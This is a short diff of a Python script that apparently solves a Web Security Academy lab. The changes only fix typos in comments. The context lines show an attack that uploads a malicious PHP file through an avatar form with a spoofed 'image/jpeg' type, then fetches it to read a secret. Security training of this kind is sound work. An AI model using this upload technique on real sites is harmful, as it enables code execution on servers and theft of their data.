@@ -36,7 +36,7 @@ def main():
     
     token_2 = token_extract(r2.text) # extract csrf token for uploading files on user "my account" page
 
-    # upload malicious php code via avatar upload. And specifiy the "image/jpeg" type on purpose.
+    # upload malicious php code via avatar upload. And specify the "image/jpeg" type on purpose.
     uri = f"https://{lab_id}.web-security-academy.net/my-account/avatar"
     files = {
         "avatar": ("contents.php", open('contents.php', 'rb'), "image/jpeg"),
@@ -45,7 +45,7 @@ def main():
     }
     r3 = s.post(uri, files=files)
         
-    # check the file we just uploded for the secret value we need
+    # check the file we just uploaded for the secret value we need
     uri = f"https://{lab_id}.web-security-academy.net/files/avatars/contents.php"
     r4 = s.get(uri)
     secret = r4.text
